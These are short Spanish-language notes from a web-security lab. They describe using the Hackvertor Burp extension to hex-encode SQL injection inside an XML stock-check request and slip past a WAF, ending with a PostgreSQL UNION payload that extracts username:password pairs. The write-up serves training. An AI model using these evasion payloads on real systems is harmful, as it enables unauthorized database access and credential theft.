
https://www.youtube.com/watch?v=XS7Onp8mWS8&ab_channel=RINKU

La idea va a ser usar hackvertor, una extensión de burpsuite pro, para poner el payload entre ciertas etiquetas xml que no son detectadas por el WAF.

![[Pasted image 20250115180046.png]]

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
	<productId>
		2
	</productId>
	<storeId>
		<@hex_entities>
			3 OR 1=1 -- -
		<@/hex_entities>
	</storeId>
</stockCheck>
```

Podemos usar diferentes tipos de encoding y etiquetas

Descubrimos que solo podemos mostrar datos en una columa
![[Pasted image 20250115180535.png]]

Funciona
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
	<productId>
		2
	</productId>
	<storeId>
		<@hex_entities>
			3 UNION SELECT username FROM users -- -
		<@/hex_entities>
	</storeId>
</stockCheck>
```

No funciona (dos columnas)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
	<productId>
		2
	</productId>
	<storeId>
		<@hex_entities>
			3 UNION SELECT username,password FROM users -- -
		<@/hex_entities>
	</storeId>
</stockCheck>
```


Al ser un postgres : 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
	<productId>
		2
	</productId>
	<storeId>
		<@hex_entities>
			3 UNION SELECT username||':'||password from users -- -
		<@/hex_entities>
	</storeId>
</stockCheck>
```